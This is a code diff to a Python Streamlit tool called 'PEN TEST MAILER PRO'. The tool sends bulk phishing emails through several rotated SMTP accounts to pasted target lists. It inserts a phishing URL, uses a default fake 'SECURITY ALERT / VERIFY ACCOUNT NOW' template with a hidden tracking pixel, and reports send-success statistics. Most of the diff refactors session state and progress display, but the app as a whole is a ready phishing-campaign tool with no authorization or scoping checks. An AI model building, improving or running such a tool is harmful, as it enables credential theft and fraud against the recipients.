@@ -25,7 +25,7 @@ def load_json(file):
 
 def save_json(data, file):
     with open(file, 'w') as f:
-        json.dump(data, f)
+        json.dump(data, f, indent=2)
 
 # Cyberpunk CSS
 st.markdown("""
@@ -78,12 +78,15 @@ class Mailer:
                 server.quit()
                 return True, "🟢 SMTP OK"
             except Exception as e:
-                return False, f"🔴 {str(e)[:50]}"
+                return False, f"🔴 {str(e)[:100]}"
         return False, "Invalid SMTP index"
 
     def send_campaign(self, targets, subject, template, phishing_url, delay=30):
         results = []
         total = len(targets)
+        
+        progress_bar = st.progress(0)
+        status_text = st.empty()
         
         def worker():
             for i, email in enumerate(targets):
@@ -99,14 +102,12 @@ class Mailer:
                 if not sent:
                     results.append({"email": email, "status": "❌ FAILED", "smtp": 0})
                 
-                progress_bar.progress((i+1)/total)
+                progress = (i+1)/total
+                progress_bar.progress(progress)
                 status_text.text(f"📤 {sum(1 for r in results if r['status']=='✅ SENT')} / {i+1}/{total}")
                 time.sleep(delay)
         
-        progress_bar = st.progress(0)
-        status_text = st.empty()
         threading.Thread(target=worker, daemon=True).start()
-        
         save_json(results, STATS_FILE)
         return results
     
@@ -128,10 +129,14 @@ class Mailer:
             server.send_message(msg)
             server.quit()
             return True, "Sent"
-        except:
-            return False, "Failed"
+        except Exception as e:
+            return False, str(e)
 
-mailer = Mailer()
+# Initialize session state
+if 'mailer' not in st.session_state:
+    st.session_state.mailer = Mailer()
+
+mailer = st.session_state.mailer
 
 # Header
 st.title("🔥 **PEN TEST MAILER PRO v3.0**")
@@ -148,32 +153,46 @@ with st.sidebar:
         st.markdown("• `smtp.gmail.com:587` (App Password)")
         st.markdown("• `smtp.elasticemail.com:2525` (1000/day)")
         
+        # Use session state for input persistence
+        if 'smtp_inputs' not in st.session_state:
+            st.session_state.smtp_inputs = {
+                'server': 'smtp-mail.outlook.com',
+                'port': 587,
+                'username': '',
+                'password': ''
+            }
+        
         col1, col2 = st.columns(2)
         with col1:
-            server = st.text_input("Server", "smtp-mail.outlook.com")
-            port = st.number_input("Port", value=587)
+            st.session_state.smtp_inputs['server'] = st.text_input("Server", 
+                value=st.session_state.smtp_inputs['server'], key="smtp_server")
+            st.session_state.smtp_inputs['port'] = st.number_input("Port", 
+                value=st.session_state.smtp_inputs['port'], key="smtp_port")
         with col2:
-            username = st.text_input("Email/Username")
-            password = st.text_input("Password", type="password")
+            st.session_state.smtp_inputs['username'] = st.text_input("Email/Username", key="smtp_username")
+            st.session_state.smtp_inputs['password'] = st.text_input("Password", type="password", key="smtp_password")
         
-        if st.button("**🚀 ADD & TEST**", use_container_width=True):
+        if st.button("**🚀 ADD & TEST**", use_container_width=True, type="primary"):
             config = {
-                "server": server,
-                "port": port,
-                "user": username,
-                "pass": password,
-                "name": username.split('@')[0][:10]
+                "server": st.session_state.smtp_inputs['server'],
+                "port": int(st.session_state.smtp_inputs['port']),
+                "user": st.session_state.smtp_inputs['username'],
+                "pass": st.session_state.smtp_inputs['password'],
+                "name": st.session_state.smtp_inputs['username'].split('@')[0][:10] if '@' in st.session_state.smtp_inputs['username'] else "SMTP"
             }
 
             if len(mailer.smtps) < 5:
+                with st.spinner("🧪 Testing SMTP connection..."):
+                    # Test before adding
+                    test_server = smtplib.SMTP(config['server'], config['port'], timeout=10)
+                    test_server.starttls()
+                    test_server.login(config['user'], config['pass'])
+                    test_server.quit()
+                
                 mailer.add_smtp(config)
-                success, msg = mailer.test_smtp(len(mailer.smtps) - 1)
-
-                if success:
-                    st.success(f"✅ **{config['name']}** added & tested!")
-                    st.rerun()
-                else:
-                    st.error(f"❌ Test failed: {msg}")
+                st.session_state.mailer.smtps = mailer.smtps  # Update session state
+                st.success(f"✅ **{config['name']}** added & tested successfully!")
+                st.rerun()
             else:
                 st.error("❌ **Max 5 accounts** - delete one first")
 
@@ -182,23 +201,25 @@ with st.sidebar:
     if mailer.smtps:
         for i, smtp in enumerate(mailer.smtps):
             col1, col2, col3 = st.columns([2,1,1])
-            col1.metric(smtp['name'], smtp['user'])
+            col1.metric(smtp.get('name', 'SMTP'), smtp['user'])
 
             if col2.button("🧪 **TEST**", key=f"test_{i}"):
                 with st.spinner(f"Testing {smtp['user']}..."):
                     success, msg = mailer.test_smtp(i)
                     if success:
-                        st.sidebar.success(msg)
+                        st.success(msg)
                     else:
-                        st.sidebar.error(msg)
+                        st.error(msg)
 
             if col3.button("🗑️", key=f"d{i}"):
                 mailer.smtps.pop(i)
                 save_json(mailer.smtps, SMTP_FILE)
+                st.session_state.mailer.smtps = mailer.smtps
                 st.rerun()
     else:
         st.warning("👆 **Add your first SMTP account**")
 
+# Rest of the code remains the same...
 # Main Campaign Tab
 st.header("📨 **LAUNCH CAMPAIGN**")
 tab1, tab2, tab3 = st.tabs(["🎯 Targets", "✉️ Message", "🚀 Send"])
@@ -213,6 +234,7 @@ with tab1:
         targets = [line.strip() for line in email_input.strip().split('\n') 
                   if '@' in line and line.strip()]
         st.success(f"✅ **{len(targets)} targets loaded**")
+        st.session_state.targets = targets  # Store in session state
         st.dataframe(pd.DataFrame({"Email": targets}), use_container_width=True)
     else:
         st.warning("👆 **Paste your target emails**")
@@ -223,7 +245,6 @@ with tab2:
     col1, col2 = st.columns(2)
     with col1:
         subject = st.text_input("📋 Subject", "🚨 URGENT: Account Security Alert")
-        
         st.subheader("🔗 **Phishing Link**")
         phishing_url = st.text_input("Your tracking/phishing URL", 
             placeholder="https://your-phish.com/track?id={uid}")
@@ -232,20 +253,21 @@ with tab2:
         st.subheader("📄 **HTML Template Editor**")
         template = st.text_area("Edit template", height=250, 
         value="""<div style="max-width: 600px; margin: 0 auto; padding: 30px; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; border-radius: 15px; box-shadow: 0 20px 40px rgba(0,0,0,0.3);">
-    <h1 style="text-align: center; margin: 0 0 20px;">🚨 SECURITY ALERT</h1>
-    <p style="font-size: 18px; line-height: 1.6;">Your account <strong>{email}</strong> requires immediate verification.</p>
-    <div style="text-align: center; margin: 30px 0;">
-        <a href="{phishing_link}" style="background: #ff4757; color: white; padding: 15px 40px; text-decoration: none; border-radius: 50px; font-size: 18px; font-weight: bold; display: inline-block; box-shadow: 0 10px 30px rgba(255,71,87,0.4); transition: all 0.3s;">
-            🔒 VERIFY ACCOUNT NOW
-        </a>
-    </div>
-    <p style="font-size: 14px; opacity: 0.9;">Ref: {uid} | This is an automated security notification</p>
-    <!-- Pixel tracker -->
-    <img src="{phishing_link.replace('phish','track')}&pixel=1" width="1" height="1" style="display:none;">
+<h1 style="text-align: center; margin: 0 0 20px;">🚨 SECURITY ALERT</h1>
+<p style="font-size: 18px; line-height: 1.6;">Your account <strong>{email}</strong> requires immediate verification.</p>
+<div style="text-align: center; margin: 30px 0;">
+    <a href="{phishing_link}" style="background: #ff4757; color: white; padding: 15px 40px; text-decoration: none; border-radius: 50px; font-size: 18px; font-weight: bold; display: inline-block; box-shadow: 0 10px 30px rgba(255,71,87,0.4); transition: all 0.3s;">
+        🔒 VERIFY ACCOUNT NOW
+    </a>
+</div>
+<p style="font-size: 14px; opacity: 0.9;">Ref: {uid} | This is an automated security notification</p>
+<!-- Pixel tracker -->
+<img src="{phishing_link.replace('phish','track')}&pixel=1" width="1" height="1" style="display:none;">
 </div>""")
 
 with tab3:
-    if 'targets' not in locals() or not mailer.smtps:
+    targets = st.session_state.get('targets', [])
+    if not targets or not mailer.smtps:
         st.error("❌ **Setup required:** Add SMTP accounts + paste targets")
     else:
         col1, col2 = st.columns(2)
@@ -254,12 +276,11 @@ with tab3:
         with col2:
             threads = st.slider("⚡ Parallel threads", 1, 3, 1)
         
-        if st.button("🚀 **LAUNCH FULL CAMPAIGN**", type="primary", use_container_width=True, help=f"{len(targets)} targets • {len(mailer.smtps)} accounts"):
-            with st.spinner("🔥 Launching cyber attack..."):
+        if st.button("🚀 **LAUNCH FULL CAMPAIGN**", type="primary", use_container_width=True):
+            with st.spinner("🔥 Launching campaign..."):
                 results = mailer.send_campaign(targets, subject, template, phishing_url, delay)
-            
             st.balloons()
-            st.success("🎉 **CAMPAIGN COMPLETE!** Check stats below.")
+            st.success("🎉 **CAMPAIGN LAUNCHED!** Check stats below.")
 
 # Stats Dashboard
 st.header("📊 **CAMPAIGN STATS**")
@@ -267,10 +288,12 @@ if os.path.exists(STATS_FILE):
     stats = pd.DataFrame(load_json(STATS_FILE))
     if not stats.empty:
         col1, col2, col3, col4 = st.columns(4)
-        col1.metric("✅ Sent", len(stats[stats['status']=='✅ SENT']))
+        sent_count = len(stats[stats['status']=='✅ SENT'])
+        total_count = len(stats)
+        col1.metric("✅ Sent", sent_count)
         col2.metric("❌ Failed", len(stats[stats['status']=='❌ FAILED']))
-        col3.metric("📧 Total", len(stats))
-        col4.metric("🎯 Success %", f"{len(stats[stats['status']=='✅ SENT'])/len(stats)*100:.1f}%")
+        col3.metric("📧 Total", total_count)
+        col4.metric("🎯 Success %", f"{sent_count/total_count*100:.1f}%" if total_count > 0 else "0%")
         
         fig = px.bar(stats['status'].value_counts().reset_index(), 
                     x='status', y='count', title="📈 Send Results",
